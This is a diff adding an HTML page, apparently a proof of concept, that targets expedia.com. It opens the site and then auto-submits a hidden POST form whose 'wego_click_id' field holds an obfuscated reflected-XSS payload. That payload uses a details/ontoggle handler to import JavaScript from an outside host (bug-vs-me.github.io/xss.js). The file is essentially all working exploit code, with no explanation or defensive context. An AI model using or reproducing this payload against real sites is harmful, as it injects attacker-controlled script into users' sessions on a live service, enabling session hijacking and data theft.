@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+  <title>Expedia Auto Flow</title>
+</head>
+<body>
+  <h3>Expedia Auto Flow Demo</h3>
+  <button id="start">Start Flow</button>
+
+  <script>
+    document.getElementById("start").onclick = () => {
+      const testUrl = "https://www.expedia.com/web/home.aspx";
+      console.log("Step 1: Opening Expedia...");
+      const childWindow = window.open(testUrl, "_blank");
+
+      if (!childWindow) {
+        alert("Popup blocked!");
+        return;
+      }
+
+      // Step 2: After 5 sec, open a POST submission window
+      setTimeout(() => {
+        console.log("Step 2: Submitting form via window.open...");
+
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = testUrl;
+        form.target = "_blank"; // open in a new tab
+        form.style.display = "none";
+
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "wego_click_id";
+        input.value = '--><details open="&quot;x&quot;"ontogglE=/*x\42\70*/import(`//bug-vs-me.github.io/xss.js`)><!--';
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        // Step 3: After another 5 sec, load home page in parent
+        setTimeout(() => {
+          console.log("Step 3: Loading Expedia in parent window...");
+          window.location.href = testUrl;
+        }, 5000);
+      }, 5000);
+    };
+  </script>
+</body>
+</html>
